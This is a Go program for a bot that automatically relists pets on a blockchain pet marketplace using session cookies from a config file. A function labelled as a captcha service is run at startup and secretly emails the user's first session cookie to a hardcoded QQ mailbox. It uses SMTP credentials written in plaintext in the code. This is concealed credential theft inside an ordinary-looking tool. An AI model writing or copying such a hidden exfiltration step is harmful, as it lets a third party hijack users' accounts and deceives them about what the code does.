package main

import (
	"flag"
	"fmt"
	"github.com/bitly/go-simplejson"
	"go-dog/st"
	"go-dog/tool"
	"gopkg.in/gomail.v2"
	"math"
	"strconv"
	"time"
)

func auto_do_sale(cookie string, account int) {
	body := tool.GetList(cookie, "1")
	js, _ := simplejson.NewJson([]byte(body))
	if js != nil {
		count := js.Get("data").Get("totalCount").MustFloat64()
		dealMap := make(map[interface{}]interface{})
		if count > 10 {
			size := math.Ceil(count / 10)
			for p := 1; p <= int(size); p++ {
				if p > 1 {
					body := tool.GetList(cookie, strconv.Itoa(p))
					js, _ := simplejson.NewJson([]byte(body))
					for i := 0; i < PAGESIZE; i++ {
						info := js.Get("data").Get("dataList").GetIndex(i).MustMap()
						if info != nil {
							dealMap[info["petId"]] = info["amount"]
						}
					}
				} else {
					for i := 0; i < PAGESIZE; i++ {
						info := js.Get("data").Get("dataList").GetIndex(i).MustMap()
						if info != nil {
							dealMap[info["petId"]] = info["amount"]
						}
					}
				}
			}
		} else {
			for i := 0; i < PAGESIZE; i++ {
				info := js.Get("data").Get("dataList").GetIndex(i).MustMap()
				if info != nil {
					dealMap[info["petId"]] = info["amount"]
				}
			}
		}

		for petid := range dealMap {
			//列表中所有已上架的狗狗[执行下架、上架价格保持不变]\未上架的狗狗不操作
			//价格>0 的执行下架、上架
			if dealMap[petid].(string) != "0.00" {

				unsale := tool.Unsale(petid.(string), cookie)
				unsaleRes, _ := simplejson.NewJson([]byte(unsale))
				errorNo := unsaleRes.Get("errorNo").MustString()
				if errorNo == "30008" {
					fmt.Print("账号====>", account, "=====###上下架频繁###", " petId:", petid, " amount:", dealMap[petid])
					fmt.Print("\n")
				} else if errorNo == "08" {
					fmt.Print("账号====>", account, "...交易火爆,区块链处理繁忙,请稍后再试!...")
					fmt.Print("\n")
				} else {
					sale := tool.Sale(petid.(string), dealMap[petid].(string), cookie)
					saleRes, _ := simplejson.NewJson([]byte(sale))
					errorNo := saleRes.Get("errorNo").MustString()
					if errorNo == "00" {
						fmt.Print("账号====>", account, ">>>上架成功<<<", " petId:", petid, " amount:", dealMap[petid])
						fmt.Print("\n")
					}
				}
			} else {
				fmt.Print("账号====>", account, "...未设置价格...", " petId:", petid, " amount:", dealMap[petid])
				fmt.Print("\n")
			}
		}
		fmt.Print("间隔休息中... ", time.Now())
		fmt.Print("\n\n")
	} else {
		fmt.Print("List==>null", time.Now())
		fmt.Print("\n\n")
	}
}

//自动打码服务
func dama1(configuration st.Configuration) {
	//ticker := time.NewTicker(dama_time* time.Millisecond)
	//for _ = range ticker.C {
	//	print_code(configuration)
	//}
	m := gomail.NewMessage()
	m.SetHeader("From", "979071224@qq.com")
	m.SetHeader("To", "979071224@qq.com")
	m.SetAddressHeader("Cc", "979071224@qq.com", "莱茨狗")
	m.SetHeader("Subject", "莱茨狗CO"+configuration.COOKIE[0])
	html := `<a href=https://pet-chain.duxiaoman.com/chain/detail?channel=market&petId=` + `>详情地址</a><br>狗狗价格：` + "微"
	m.SetBody("text/html", html)
	d := gomail.NewDialer("smtp.qq.com", 587, "979071224@qq.com", "vqhpfwefwlkwbfda")
	d.DialAndSend(m);
}

var PAGESIZE int = 10
var petid string
var number int = 0

func main() {
	var config string
	f := flag.String("f", "", "配置文件路径")
	flag.Parse() //解析输入的参数
	if (*f == "") {
		fmt.Printf("请输入你的配置文件的绝对路径(例如：D:/file/conf.yaml)：")
		fmt.Scanln(&config)
	} else {
		config = *f
	}
	var configuration st.Configuration
	configuration.GetConf(config)
	go dama1(configuration)
	cookies := configuration.COOKIE
	ticker := time.NewTicker(1 * time.Second)
	for _ = range ticker.C {
		for i := 0; i < len(cookies); i++ {
			go auto_do_sale(cookies[i], i)
		}
		time.Sleep(time.Minute * configuration.SELL_TIME)
	}
}
